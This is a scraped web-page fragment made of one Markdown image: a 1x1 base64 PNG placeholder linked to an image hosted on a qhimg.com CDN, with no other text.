[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014ac0a7b1bb69306d.png)
